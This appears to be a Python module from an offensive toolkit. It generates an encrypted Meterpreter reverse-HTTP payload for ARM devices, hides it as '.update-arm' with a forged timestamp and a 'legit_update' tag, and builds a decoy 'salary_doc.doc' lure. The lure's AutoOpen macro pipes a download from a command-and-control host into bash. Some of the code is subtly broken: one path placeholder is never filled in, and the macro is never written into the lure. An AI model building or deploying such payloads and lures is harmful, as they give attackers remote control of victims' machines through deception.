import os
import hashlib
from config import settings


class ArmPayloadGenerator:
    @staticmethod
    def generate_staged_payload():
        """生成树莓派专用分阶段载荷"""
        output = f"{settings.PAYLOAD_DIR}/.update-arm"
        cmd = (
            f"msfvenom -p linux/{settings.SYSTEM_ARCH}/meterpreter_reverse_http "
            f"LHOST={settings.C2_IP} LPORT={settings.C2_PORT} "
            "-f elf -o {output} "
            "--encrypt aes256 --encrypt-key $(openssl rand -hex 16)"
        )
        os.system(cmd)

        # 添加诱饵文件元数据
        os.system(f"touch -t 202301010000 {output}")
        os.system(f"setfattr -n user.metadata -v 'legit_update' {output}")
        return output

    @staticmethod
    def create_macro_document():
        """生成带隐蔽宏的文档"""
        macro_code = f"""
Sub AutoOpen()
    Shell("curl -s {settings.C2_IP}:{settings.C2_PORT}/payload | bash")
End Sub
"""
        decoy_path = f"{settings.PAYLOAD_DIR}/salary_doc.doc"
        with open(decoy_path, 'w') as f:
            f.write('\n'.join([
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
                '<w:document xmlns:w="urn:schemas-microsoft-com:office:word">',
                '<w:body><w:altChunk r:id="payload" xmlns:r="urn:schemas-microsoft-com:office:r"/>',
                '</w:body></w:document>'
            ]))

        # 生成哈希用于追踪
        file_hash = hashlib.md5(open(decoy_path, 'rb').read()).hexdigest()
        with open(f"{settings.DATA_DIR}/hashes.log", 'a') as f:
            f.write(f"{file_hash}:{decoy_path}\n")

        return decoy_path